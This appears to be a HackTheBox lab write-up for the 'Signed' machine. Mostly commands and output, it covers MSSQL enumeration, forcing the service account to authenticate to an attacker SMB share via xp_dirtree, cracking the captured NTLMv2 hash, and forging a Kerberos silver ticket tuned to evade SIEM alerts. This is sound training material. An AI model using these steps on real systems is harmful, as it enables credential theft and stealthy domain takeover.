---
render_with_liquid: false
title: HackTheBox Writeup - Signed
date: 2025-10-18 00:16:44 +1400
tags: [hackthebox, nmap, windows, ad, assumed-breach, mssql, mssqlclient, impacket, rid-bruteforce, mssql-xp-dirtree, coerce-authentication, responder, hashcat, silver-ticket, aeskrbkeygen, opsec-safe, opsec-safe-siem, mssql-xp-cmdshell, mssql-file-read, file-read, discover-secrets, runascs]
image:
    path: https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a00e8c83-0b2c-42d6-a0d0-56732621739e.png
    width: 640
    height: 480
---



`Signed` is a medium-difficulty Windows machine that demonstrates the exploitation of an MSSQL server by extracting the NTLMv2 hash of the service account running the instance and cracking the hash to obtain its password. This enables the issuance of silver tickets for user impersonation and service access. The domain is then enumerated via the MSSQL instance to gather the necessary information to impersonate the Administrator account and grant command execution through the MSSQL service. For privilege escalation, the recently discovered [CVE-2025-33073](https://nvd.nist.gov/vuln/detail/CVE-2025-33073), an NTLM reflection attack, is leveraged to perform self-relaying even with signing enforced, providing access to the `WinRMS` interface.

# Recon
---

## Hosts

> `pt` command is a **custom pentest framework** to manage hosts and variables, it is not required to reproduce the steps in this writeup
{: .prompt-info }

```bash
┌──(bravosec㉿fsociety)-[~/htb/Signed]
└─$ pt init '10.10.11.90 DC01.SIGNED.HTB SIGNED.HTB DC01'
+---------+--------+-------------+-----------------+
| PROFILE | STATUS |     IP      |     DOMAIN      |
+---------+--------+-------------+-----------------+
| signed  | on     | 10.10.11.90 | DC01.SIGNED.HTB |
| signed  | on     | 10.10.11.90 | SIGNED.HTB      |
| signed  | on     | 10.10.11.90 | DC01            |
+---------+--------+-------------+-----------------+

╒═══════════╤═════════════╤═════════════════╤════════════╤═════════════╤════════╤══════════════╤═══════════╤═════════════════╕
│ profile   │ lhost       │ rhost           │ domain     │ ip          │ user   │ pass         │ dc_name   │ dc_fqdn         │
╞═══════════╪═════════════╪═════════════════╪════════════╪═════════════╪════════╪══════════════╪═══════════╪═════════════════╡
│ signed    │ 10.10.14.45 │ DC01.SIGNED.HTB │ SIGNED.HTB │ 10.10.11.90 │ scott  │ Sm230#C5NatH │ DC01      │ DC01.SIGNED.HTB │
╘═══════════╧═════════════╧═════════════════╧════════════╧═════════════╧════════╧══════════════╧═══════════╧═════════════════╛
```


## Nmap

```bash
# Nmap 7.95 scan initiated Sat Oct 18 00:16:44 2025 as: /usr/lib/nmap/nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 1433, DC01.SIGNED.HTB
Nmap scan report for DC01.SIGNED.HTB (10.10.11.90)
Host is up, received user-set (0.28s latency).
Scanned at 2025-10-18 00:16:44 CST for 15s

PORT     STATE SERVICE  REASON          VERSION
1433/tcp open  ms-sql-s syn-ack ttl 127 Microsoft SQL Server 2022 16.00.1000.00; RTM
|_ssl-date: 2025-10-17T16:17:47+00:00; +48s from scanner time.
| ms-sql-info: 
|   10.10.11.90:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-17T10:57:32
| Not valid after:  2055-10-17T10:57:32
| MD5:   2c92:25f4:6667:564d:84f4:72d8:36dc:3979
| SHA-1: 625d:696f:66fa:0e8b:cfc7:e0ff:1ca9:25c1:6be5:4a23
| -----BEGIN CERTIFICATE-----
| MIIEADCCAmigAwIBAgIQcBpefFXm46lEOhIOVWr/9jANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjUxMDE3MTA1NzMyWhgPMjA1NTEwMTcxMDU3MzJaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCAaIwDQYJKoZIhvcNAQEBBQADggGPADCCAYoCggGBAK3ZlduE
| ZtP5I1dgQHwEXYGH+WMItcntT0/ArU+OqiBKde0cprimLfaRq4Kg4HvuzpjhvFHN
| Ssh2fJh7scPNlpCK7nIByHiqg2SSlfQL1WHpjCGKWlcAXoKejyW6g0datvOENBE3
| n/6DOlgTkWw9A3dh73rWlJbuZsFAOF0XQI/W+r9OrIn9C14vQg9IxdpwuVQ7D2pC
| XXlUgvgkTE5kSS1HtqochAC/BA869F51bcO0D54532r5V4YJIhNpnkRN5fA+uTjw
| M4NyRYdwJjpZYbTwy2QC35XhRGYmd5U6pFm+Z7p9qG3/cahhTT5hi8URPY1CtPcW
| omvKh12dgz31HVlZUQmBniHO4mEB5xLBtcS73ugE6AyCiSFlbvi8IbdqHzPM+Bne
| o3FJG4lhD/vqqgy1jpmJuJfvkJgbLZxY4FeyQHtBg5kXXRRpMeROAZnf3K2SfLe2
| p388xEM0vW2rUEVxGusI+EKLIaRHQxbL/bi/FIwLg0ubFaXTDPg8nj1EzQIDAQAB
| MA0GCSqGSIb3DQEBCwUAA4IBgQBM630WrCxprU95EtlsxtxmNCL5GkL4umLBV4Hq
| Tq8hOCLH4ajn53171xYfbCy7ITFlhKodQ8HGqC/dKaveXKivpca2RbENZVkbjpQ/
| vdaMb6Ho6a6B0YIPR93cOzSflNYjIHaafZ2GYdpKZcvhCKKjzYeTl9ZGl0PniU2C
| O/D+urUoiw2xmzF3T2O+CbWMaetp7eLr/R6BhusY0ILJpnrADWmSblCe1cMdPpKM
| nHscTFhwNOXB6b15Po3WGtL0WIqdAOlcvnmpoj8a6tIo8CwXK69rfjb6BRNuyh3T
| ErClFcYAuj7LLCovCDMNEtxDAFI9uVt8IMk9uTcqPXxXQ4VdFPCTot4cScRtPC+T
| 7ZoIUj3G4FqNwpdR3FP75RKQKj5LVcQvp39KTO8PkAW+Mw0FtDdaOPMztALRKv5u
| diPOHbaLF8VGfM8OR5zLte+Db28rm1QDjPxMX3WuWf4KKxZuVYJdmITJiK49mg2y
| PooPeQgMzLIDImXPWfY/+39y4oQ=
|_-----END CERTIFICATE-----
| ms-sql-ntlm-info: 
|   10.10.11.90:1433: 
|     Target_Name: SIGNED
|     NetBIOS_Domain_Name: SIGNED
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: SIGNED.HTB
|     DNS_Computer_Name: DC01.SIGNED.HTB
|     DNS_Tree_Name: SIGNED.HTB
|_    Product_Version: 10.0.17763

Host script results:
|_clock-skew: mean: 47s, deviation: 0s, median: 47s

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct 18 00:16:59 2025 -- 1 IP address (1 host up) scanned in 14.90 seconds
```


## 1433 - MSSQL

```bash
┌──(bravosec㉿fsociety)-[~/htb/Signed]
└─$ mssqlclient.py 'scott':'Sm230#C5NatH'@10.10.11.90
Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (scott  guest@master)> select @@version
                                                                                                                                                                                                                 
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Microsoft SQL Server 2022 (RTM) - 16.0.1000.6 (X64)
        Oct  8 2022 05:58:25
        Copyright (C) 2022 Microsoft Corporation
        Enterprise Evaluation Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)

SQL (scott  guest@master)>
```

```bash
SQL (scott  guest@master)> enable_xp_cmdshell
ERROR(DC01): Line 105: User does not have permission to perform this action.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC01): Line 105: User does not have permission to perform this action.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
SQL (scott  guest@master)> xp_cmdshell "whoami"
ERROR(DC01): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
```

```bash
SQL (scott  guest@master)> enum_users
UserName             RoleName   LoginName   DefDBName   DefSchemaName       UserID     SID
------------------   --------   ---------   ---------   -------------   ----------   -----
dbo                  db_owner   sa          master      dbo             b'1         '   b'01'
guest                public     NULL        NULL        guest           b'2         '   b'00'
INFORMATION_SCHEMA   public     NULL        NULL        NULL            b'3         '    NULL
sys                  public     NULL        NULL        NULL            b'4         '    NULL
SQL (scott  guest@master)> enum_logins
name    type_desc   is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin
-----   ---------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------
sa      SQL_LOGIN             0          1               0             0            0              0           0           0           0
scott   SQL_LOGIN             0          0               0             0            0              0           0           0           0
SQL (scott  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee   grantor
----------   --------   ---------------   ----------   -------   -------
SQL (scott  guest@master)> enum_links
SRV_NAME   SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE   SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT
--------   ----------------   -----------   --------------   ------------------   ------------   -------
DC01       SQLNCLI            SQL Server    DC01             NULL                 NULL           NULL
Linked Server   Local Login   Is Self Mapping   Remote Login
-------------   -----------   ---------------   ------------
```

```bash
SQL (scott  guest@master)> enum_db
name     is_trustworthy_on
------   -----------------
master                   0
tempdb                   0
model                    0
msdb                     1
```

```bash
SQL (scott  guest@master)> xp_dirtree "C:\"
subdirectory   depth   file
------------   -----   ----
```


# User Flag
---

## Auth as mssqlsvc


### Assumed breach scenario

![](/assets/obsidian/ec6a45a0e016a4a89438817e09959f7e.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Signed]
└─$ creds-set 'scott' 'Sm230#C5NatH'
[+] Password set for user scott
```


### 1433 - Mssql : RID brute force

```bash
┌──(bravosec㉿fsociety)-[~/htb/Signed]
└─$ nxc mssql $(pt get rhost) -u "$(pt get user)" -p "$(pt get pass)" --local-auth --rid-brute --log nxc_mssql_rid-brute.log
MSSQL       10.10.11.90     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
MSSQL       10.10.11.90     1433   DC01             [+] DC01\scott:Sm230#C5NatH
MSSQL       10.10.11.90     1433   DC01             498: SIGNED\Enterprise Read-only Domain Controllers
MSSQL       10.10.11.90     1433   DC01             500: SIGNED\Administrator
MSSQL       10.10.11.90     1433   DC01             501: SIGNED\Guest
MSSQL       10.10.11.90     1433   DC01             502: SIGNED\krbtgt
MSSQL       10.10.11.90     1433   DC01             512: SIGNED\Domain Admins
MSSQL       10.10.11.90     1433   DC01             513: SIGNED\Domain Users
MSSQL       10.10.11.90     1433   DC01             514: SIGNED\Domain Guests
MSSQL       10.10.11.90     1433   DC01             515: SIGNED\Domain Computers
MSSQL       10.10.11.90     1433   DC01             516: SIGNED\Domain Controllers
MSSQL       10.10.11.90     1433   DC01             517: SIGNED\Cert Publishers
MSSQL       10.10.11.90     1433   DC01             518: SIGNED\Schema Admins
MSSQL       10.10.11.90     1433   DC01             519: SIGNED\Enterprise Admins
MSSQL       10.10.11.90     1433   DC01             520: SIGNED\Group Policy Creator Owners
MSSQL       10.10.11.90     1433   DC01             521: SIGNED\Read-only Domain Controllers
MSSQL       10.10.11.90     1433   DC01             522: SIGNED\Cloneable Domain Controllers
MSSQL       10.10.11.90     1433   DC01             525: SIGNED\Protected Users
MSSQL       10.10.11.90     1433   DC01             526: SIGNED\Key Admins
MSSQL       10.10.11.90     1433   DC01             527: SIGNED\Enterprise Key Admins
MSSQL       10.10.11.90     1433   DC01             553: SIGNED\RAS and IAS Servers
MSSQL       10.10.11.90     1433   DC01             571: SIGNED\Allowed RODC Password Replication Group
MSSQL       10.10.11.90     1433   DC01             572: SIGNED\Denied RODC Password Replication Group
MSSQL       10.10.11.90     1433   DC01             1000: SIGNED\DC01$
MSSQL       10.10.11.90     1433   DC01             1101: SIGNED\DnsAdmins
MSSQL       10.10.11.90     1433   DC01             1102: SIGNED\DnsUpdateProxy
MSSQL       10.10.11.90     1433   DC01             1103: SIGNED\mssqlsvc
MSSQL       10.10.11.90     1433   DC01             1104: SIGNED\HR
MSSQL       10.10.11.90     1433   DC01             1105: SIGNED\IT
MSSQL       10.10.11.90     1433   DC01             1106: SIGNED\Finance
MSSQL       10.10.11.90     1433   DC01             1107: SIGNED\Developers
MSSQL       10.10.11.90     1433   DC01             1108: SIGNED\Support
MSSQL       10.10.11.90     1433   DC01             1109: SIGNED\oliver.mills
MSSQL       10.10.11.90     1433   DC01             1110: SIGNED\emma.clark
MSSQL       10.10.11.90     1433   DC01             1111: SIGNED\liam.wright
MSSQL       10.10.11.90     1433   DC01             1112: SIGNED\noah.adams
MSSQL       10.10.11.90     1433   DC01             1113: SIGNED\ava.morris
MSSQL       10.10.11.90     1433   DC01             1114: SIGNED\sophia.turner
MSSQL       10.10.11.90     1433   DC01             1115: SIGNED\james.morgan
MSSQL       10.10.11.90     1433   DC01             1116: SIGNED\mia.cooper
MSSQL       10.10.11.90     1433   DC01             1117: SIGNED\elijah.brooks
MSSQL       10.10.11.90     1433   DC01             1118: SIGNED\isabella.evans
MSSQL       10.10.11.90     1433   DC01             1119: SIGNED\lucas.murphy
MSSQL       10.10.11.90     1433   DC01             1120: SIGNED\william.johnson
MSSQL       10.10.11.90     1433   DC01             1121: SIGNED\charlotte.price
MSSQL       10.10.11.90     1433   DC01             1122: SIGNED\henry.bennett
MSSQL       10.10.11.90     1433   DC01             1123: SIGNED\amelia.kelly
MSSQL       10.10.11.90     1433   DC01             1124: SIGNED\jackson.gray
MSSQL       10.10.11.90     1433   DC01             1125: SIGNED\harper.diaz
MSSQL       10.10.11.90     1433   DC01             1126: SIGNED\SQLServer2005SQLBrowserUser$DC01
```

Extract only domain users to a file

```bash
┌──(bravosec㉿fsociety)-[~/htb/Signed]
└─$ cat nxc_mssql_rid-brute.log | grep ': ' | awk -F '\' '{print $NF}' > mssql_rid-resolved.lst
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Signed]
└─$ cat mssql_users.lst
Administrator
Guest
krbtgt
mssqlsvc
oliver.mills
emma.clark
liam.wright
noah.adams
ava.morris
sophia.turner
james.morgan
mia.cooper
elijah.brooks
isabella.evans
lucas.murphy
william.johnson
charlotte.price
henry.bennett
amelia.kelly
jackson.gray
harper.diaz
```


### (Failed) 1433 - Mssql : Password spray

Username as password spray

```bash
┌──(bravosec㉿fsociety)-[~/htb/Signed]
└─$ nxc mssql $(pt get rhost) -u mssql_users.lst -p mssql_users.lst --local-auth --no-bruteforce
MSSQL       10.10.11.90     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
MSSQL       10.10.11.90     1433   DC01             [-] DC01\Administrator:Administrator (Login failed for user 'Administrator'. Please try again with or without '--local-auth')
[...]
```

Spray known password

```bash
┌──(bravosec㉿fsociety)-[~/htb/Signed]
└─$ nxc mssql $(pt get rhost) -u mssql_users.lst -p 'Sm230#C5NatH' --local-auth --no-bruteforce
MSSQL       10.10.11.90     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
MSSQL       10.10.11.90     1433   DC01             [-] DC01\Administrator:Sm230#C5NatH (Login failed for user 'Administrator'. Please try again with or without '--local-auth')
[...]
```


### 1433 - Mssql : Coerce authentication

Start **responder** in analyzer mode

```bash
┌──(bravosec㉿fsociety)-[~/htb/Signed]
└─$ sudo responder -A -I tun0 -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.6.0
[...]
```

Use `xp_dirtree` to send authentication to our rogue SMB server

```bash
┌──(bravosec㉿fsociety)-[~/htb/Signed]
└─$ mssqlclient.py 'scott':'Sm230#C5NatH'@10.10.11.90
Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (scott  guest@master)> xp_dirtree \\10.10.14.45\c$
subdirectory   depth   file
------------   -----   ----
```

```bash
[SMB] NTLMv2-SSP Client   : 10.10.11.90
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:028c0a29aa1130f4:37720B9A7A726FA27DCCB7900B19BFB1:010100000000000000B6120B533CDC019502DB55518DDD200000000002000800330053005600330001001E00570049004E002D004B00430035004E004C005A003900390053005A004C0004003400570049004E002D004B00430035004E004C005A003900390053005A004C002E0033005300560033002E004C004F00430041004C000300140033005300560033002E004C004F00430041004C000500140033005300560033002E004C004F00430041004C000700080000B6120B533CDC0106000400020000000800300030000000000000000000000000300000DCC74947D28CAA62B8B999E81033EDE7659BEA639F6B5237F153D56083D1226D0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00340035000000000000000000
```


### Crack NTLMv2 hash

```bash
┌──(bravosec㉿fsociety)-[~/htb/Signed]
└─$ hashcat /usr/share/responder/logs/SMB-NTLMv2-SSP-10.10.11.90.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode
[...]

┌──(bravosec㉿fsociety)-[~/htb/Signed]
└─$ hashcat /usr/share/responder/logs/SMB-NTLMv2-SSP-10.10.11.90.txt /usr/share/wordlists/rockyou.txt --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

5600 | NetNTLMv2 | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

MSSQLSVC::SIGNED:a6a6a1127d18042f:f360c3872e7241d6efbdf706b49ff89d:010100000000000000b6120b533cdc01428e7381d742be8f0000000002000800330053005600330001001e00570049004e002d004b00430035004e004c005a003900390053005a004c0004003400570049004e002d004b00430035004e004c005a003900390053005a004c002e0033005300560033002e004c004f00430041004c000300140033005300560033002e004c004f00430041004c000500140033005300560033002e004c004f00430041004c000700080000b6120b533cdc0106000400020000000800300030000000000000000000000000300000dcc74947d28caa62b8b999e81033ede7659bea639f6b5237f153d56083d1226d0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00340035000000000000000000:purPLE9795!@
```


## Shell as mssqlsvc


### (Failed) 1433 - Mssql : Password spray

```bash
nxc mssql $(pt get rhost) -u mssql_users.lst -p 'purPLE9795!@' --continue-on-success
```


### 1433 - Mssql : Silver ticket

```bash
┌──(bravosec㉿fsociety)-[~/htb/Signed]
└─$ mssqlclient.py -show 'mssqlsvc':'purPLE9795!@'@10.10.11.90 -windows-auth
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
```

- `SIGNED\IT` has `sysadmin` role

```bash
SQL (SIGNED\mssqlsvc  guest@master)> enum_logins
[%] select r.name,r.type_desc,r.is_disabled, sl.sysadmin, sl.securityadmin, sl.serveradmin, sl.setupadmin, sl.processadmin, sl.diskadmin, sl.dbcreator, sl.bulkadmin from  master.sys.server_principals r left join master.sys.syslogins sl on sl.sid = r.sid where r.type in ('S','E','X','U','G')
name                                type_desc       is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin
---------------------------------   -------------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------
sa                                  SQL_LOGIN                 0          1               0             0            0              0           0           0           0
##MS_PolicyEventProcessingLogin##   SQL_LOGIN                 1          0               0             0            0              0           0           0           0
##MS_PolicyTsqlExecutionLogin##     SQL_LOGIN                 1          0               0             0            0              0           0           0           0
SIGNED\IT                           WINDOWS_GROUP             0          1               0             0            0              0           0           0           0
NT SERVICE\SQLWriter                WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0
NT SERVICE\Winmgmt                  WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0
NT SERVICE\MSSQLSERVER              WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0
NT AUTHORITY\SYSTEM                 WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0
NT SERVICE\SQLSERVERAGENT           WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0
NT SERVICE\SQLTELEMETRY             WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0
scott                               SQL_LOGIN                 0          0               0             0            0              0           0           0           0
SIGNED\Domain Users                 WINDOWS_GROUP             0          0               0             0            0              0           0           0           0
```

- The user `dc_admin` in the `msdb` database has the **IMPERSONATE** permission on another **USER**, granted by `MS_DataCollectorInternalUser`

```bash
SQL (SIGNED\mssqlsvc  guest@master)> enum_impersonate
[%] select name from sys.databases
[%] use master; SELECT 'USER' as 'execute as', DB_NAME() AS 'database',pe.permission_name,pe.state_desc, pr.name AS 'grantee', pr2.name AS 'grantor' FROM sys.database_permissions pe JOIN sys.database_principals pr ON   pe.grantee_principal_id = pr.principal_Id JOIN sys.database_principals pr2 ON   pe.grantor_principal_id = pr2.principal_Id WHERE pe.type = 'IM'
[%] use tempdb; SELECT 'USER' as 'execute as', DB_NAME() AS 'database',pe.permission_name,pe.state_desc, pr.name AS 'grantee', pr2.name AS 'grantor' FROM sys.database_permissions pe JOIN sys.database_principals pr ON   pe.grantee_principal_id = pr.principal_Id JOIN sys.database_principals pr2 ON   pe.grantor_principal_id = pr2.principal_Id WHERE pe.type = 'IM'
[%] use model; SELECT 'USER' as 'execute as', DB_NAME() AS 'database',pe.permission_name,pe.state_desc, pr.name AS 'grantee', pr2.name AS 'grantor' FROM sys.database_permissions pe JOIN sys.database_principals pr ON   pe.grantee_principal_id = pr.principal_Id JOIN sys.database_principals pr2 ON   pe.grantor_principal_id = pr2.principal_Id WHERE pe.type = 'IM'
[%] use msdb; SELECT 'USER' as 'execute as', DB_NAME() AS 'database',pe.permission_name,pe.state_desc, pr.name AS 'grantee', pr2.name AS 'grantor' FROM sys.database_permissions pe JOIN sys.database_principals pr ON   pe.grantee_principal_id = pr.principal_Id JOIN sys.database_principals pr2 ON   pe.grantor_principal_id = pr2.principal_Id WHERE pe.type = 'IM'
[%] SELECT 'LOGIN' as 'execute as', '' AS 'database',pe.permission_name,pe.state_desc,pr.name AS 'grantee', pr2.name AS 'grantor' FROM sys.server_permissions pe JOIN sys.server_principals pr   ON pe.grantee_principal_id = pr.principal_Id JOIN sys.server_principals pr2   ON pe.grantor_principal_id = pr2.principal_Id WHERE pe.type = 'IM'
execute as   database   permission_name   state_desc   grantee    grantor
----------   --------   ---------------   ----------   --------   ----------------------------
b'USER'      msdb       IMPERSONATE       GRANT        dc_admin   MS_DataCollectorInternalUser
[%] use master
```

- There's a linked server `DC01`

```bash
SQL (SIGNED\mssqlsvc  guest@master)> enum_links
[%] EXEC sp_linkedservers
SRV_NAME   SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE   SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT
--------   ----------------   -----------   --------------   ------------------   ------------   -------
DC01       SQLNCLI            SQL Server    DC01             NULL                 NULL           NULL
[%] EXEC sp_helplinkedsrvlogin
Linked Server   Local Login   Is Self Mapping   Remote Login
-------------   -----------   ---------------   ------------
DC01            NULL                        1   NULL
```

> We can forge a silver ticket to alter `IT` into our group info
> 
> Required info:
> - Domain SID
> - `mssqlsvc` user's RID
> - `mssqlsvc` user's password in RC4/AES format
> - `IT` group's RID
{: .prompt-info }

Get domain SID and `mssqlsvc`'s RID

```bash
SQL (SIGNED\mssqlsvc  guest@master)> SELECT SUSER_SID()
[%] SELECT SUSER_SID()

-----------------------------------------------------------
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000'
```

> `/opt/sectools/ad/custom/scripts/bin_sid_to_string.py`

```python
import sys


def bin_sid_to_string(s: str):
    b = bytes.fromhex(s)
    rev = b[0]
    subcount = b[1]
    id_auth = int.from_bytes(b[2:8], byteorder='big')
    subs = [str(int.from_bytes(b[8+i*4:8+(i+1)*4], byteorder='little')) for i in range(subcount)]
    return "S-{}-{}".format(rev, str(id_auth) + ('' if not subs else '-' + '-'.join(subs)))


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <sid-binary-string>")
        sys.exit()

    print(bin_sid_to_string(sys.argv[1]))
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Signed]
└─$ python /opt/sectools/ad/custom/scripts/bin_sid_to_string.py '0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000'
S-1-5-21-4088429403-1159899800-2753317549-1103
```

> - SID: `S-1-5-21-4088429403-1159899800-2753317549`
> - RID: `1103`
{: .prompt-info }

Get `SIGNED\IT` group's RID

```bash
┌──(bravosec㉿fsociety)-[~/htb/Signed]
└─$ cat nxc_mssql_rid-brute.log | grep -F 'SIGNED\IT'
2025-10-13 11:06:43 | mssql.py:427 - INFO - MSSQL       10.10.11.90     1433   DC01             1105: SIGNED\IT
```

Setup the tool to generate **aes** key

```bash
cd /opt/sectools/ad/
git clone https://github.com/Tw1sm/aesKrbKeyGen.git
cd aesKrbKeyGen
uv add --script aesKrbKeyGen.py -r requirements.txt
git commit -am "uv env setup"
```

Derive the password with AES256 keys

```bash
┌──(bravosec㉿fsociety)-[~/htb/Signed]
└─$ uv run /opt/sectools/ad/aesKrbKeyGen/aesKrbKeyGen.py -domain 'SIGNED.HTB' -user 'mssqlsvc' -pass 'purPLE9795!@'
[*] Salt: SIGNED.HTBmssqlsvc

[+] AES256 Key: B3E4580CFD006962CD759325391CCCC3CBDB7BE5128C170AEB4557023A948DB8
[+] AES128 Key: 3BFC0458513DBDF1293AB35F2934AB67
```

Forge a Service Ticket with `IT` group info

```bash
┌──(bravosec㉿fsociety)-[~/htb/Signed]
└─$ ticketer.py -domain 'SIGNED.htb' -domain-sid "S-1-5-21-4088429403-1159899800-2753317549" -user-id '1103' -groups '1105' -spn 'mssqlsvc/DC01.SIGNED.HTB' -duration 10 -aesKey 'B3E4580CFD006962CD759325391CCCC3CBDB7BE5128C170AEB4557023A948DB8' mssqlsvc
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for SIGNED.htb/mssqlsvc
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in mssqlsvc.ccache
```

> Crafted the service ticket with some options to get stealthier under SIEMs
> - `-aesKey B3E*` : KDC uses AES256 key to encrypt tickets by default, so SIEMs usually alert abnormal tickets encrypted by RC4 (NT hash)
> - `duration 10` : Service Ticket's default expiration time is `10` hours, but `ticketer.py` sets it to `10` years by default, so SIEMs usually alert abnormal tickets encrypted with none-default expiration time
> - `-user-id '1103' -groups '1105'` : Grant `mssqlsvc` `IT` group for ST instead of impersonating other high privilege users
{: .prompt-info }

Since there is not much clock-skew with DC, we don't have to sync our time for **kerberos**

```bash
┌──(bravosec㉿fsociety)-[~/htb/Signed]
└─$ cat nmap/full_tcp_scan.nmap | grep clock-skew
|_clock-skew: mean: 47s, deviation: 0s, median: 47s
```

After connecting to MSSQL service on `DC01.SIGNED.htb` as a group member of `IT`, we now have `sysadmin` role

```bash
┌──(bravosec㉿fsociety)-[~/htb/Signed]
└─$ KRB5CCNAME='mssqlsvc.ccache' mssqlclient.py -k DC01.SIGNED.htb
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
